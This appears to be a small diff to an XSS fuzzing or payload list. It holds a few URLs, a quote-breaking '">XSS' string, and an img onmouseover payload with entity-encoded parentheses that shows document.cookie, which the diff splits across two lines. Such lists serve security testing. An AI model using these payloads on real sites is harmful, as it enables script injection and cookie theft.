@@ -28,7 +28,8 @@ https://fb.com
 http://youtube.com/
 http://instagram.com
 http://66.102.7.147/">XSS
-“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+“>
+<img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
 
 
 
